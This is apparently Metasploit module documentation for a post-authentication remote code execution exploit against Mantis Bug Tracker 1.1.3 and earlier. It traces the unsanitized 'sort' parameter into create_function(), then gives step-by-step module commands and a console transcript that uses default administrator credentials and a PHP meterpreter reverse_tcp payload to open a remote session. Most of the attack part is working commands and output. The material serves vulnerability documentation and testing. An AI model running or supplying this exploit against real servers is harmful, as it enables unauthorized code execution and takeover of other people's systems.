## Vulnerable Application

Mantis Bug Tracker versions 1.1.3 and earlier are vulnerable to a post-authentication Remote Code Execution vulnerability. The `manage_proj_page.php` file passes the `$_GET['sort']` parameter to `/core/utility_api.php`'s `multi_sort()` function as parameter `$p_key`, which then passes it (unsanitized) to the `create_function()` as part of the payload `"return $t_factor * strnatcasecmp( \$a['$p_key'], \$b['$p_key'] );"`. A properly formatted `sort` param can escape and inject arbitrary PHP, which is then used to cradle and execute a PHP meterpreter payload. This has been tested from v1.0.0 to v1.1.3.

## Verification Steps

  1. Download and install [mantis 1.1.3](https://www.exploit-db.com/apps/9d9079342cea8392a80d47d22b4b6d42-mantisbt-release-1.1.3.tar.gz)
  2. `use exploit/multi/http/mantisbt_manage_proj_page_rce`
  3. `set RHOST IP`
  4. `set TARGETURI /`
  5. `set USERNAME administrator`
  6. `set PASSWORD root`
  7. `set PAYLOAD php/meterpreter/reverse_tcp`
  8. `set LHOST IP`
  9. `exploit`
  10. **Verify** a new Meterpreter session is started

## Scenarios

### MantisBT v1.1.3 on Debian

```
msf > use exploit/multi/http/mantisbt_manage_proj_page_rce
msf exploit(multi/http/mantisbt_manage_proj_page_rce) > set RHOST localhost
RHOST => localhost
msf exploit(multi/http/mantisbt_manage_proj_page_rce) > set RPORT 8000
RPORT => 8000
msf exploit(multi/http/mantisbt_manage_proj_page_rce) > set TARGETURI /
TARGETURI => /
msf exploit(multi/http/mantisbt_manage_proj_page_rce) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(multi/http/mantisbt_manage_proj_page_rce) > run

[!] You are binding to a loopback address by setting LHOST to ::1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on ::1:4444 
[*] Checking Mantis version ...
[*] Mantis version 1.1.3 detected
[*] Sending payload ...
[*] Logging in as administrator:root
[*] Sending stage (37775 bytes) to ::1
[*] Sleeping before handling stage...
[*] Meterpreter session 1 opened (::1:4444 -> ::1:48182) at 2018-04-14 07:14:00 -0400 
```

